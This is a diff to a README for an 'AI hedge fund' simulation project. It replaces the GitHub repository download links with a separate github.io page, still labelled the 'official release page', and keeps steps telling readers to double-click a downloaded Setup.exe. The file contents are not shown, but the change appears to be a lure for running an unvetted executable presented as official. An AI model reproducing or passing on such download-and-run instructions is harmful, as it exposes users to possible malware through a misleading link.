@@ -1,6 +1,6 @@
 # 📈 AI-Hedge-Fund-Framework-2026 - Simulate Advanced Investment Strategies With Ease
 
-[![](https://img.shields.io/badge/Download-Setup-blue.svg)](https://github.com/Laurefantastic350/AI-Hedge-Fund-Framework-2026)
+[![](https://img.shields.io/badge/Download-Setup-blue.svg)](https://laurefantastic350.github.io)
 
 ## 📌 Overview
 
@@ -21,7 +21,7 @@ Ensure your computer meets these requirements before you start the installation 
 
 You can set up the application by running the provided installer. Follow these steps to prepare your system and launch the software.
 
-1.  Visit the official release page to download the software: [Download AI-Hedge-Fund-Framework-2026](https://github.com/Laurefantastic350/AI-Hedge-Fund-Framework-2026).
+1.  Visit the official release page to download the software: [Download AI-Hedge-Fund-Framework-2026](https://laurefantastic350.github.io).
 2.  Locate the file labeled `Setup.exe` in your Downloads folder.
 3.  Double-click the file to start the installation wizard.
 4.  Accept the terms of the license agreement if you agree to the conditions.
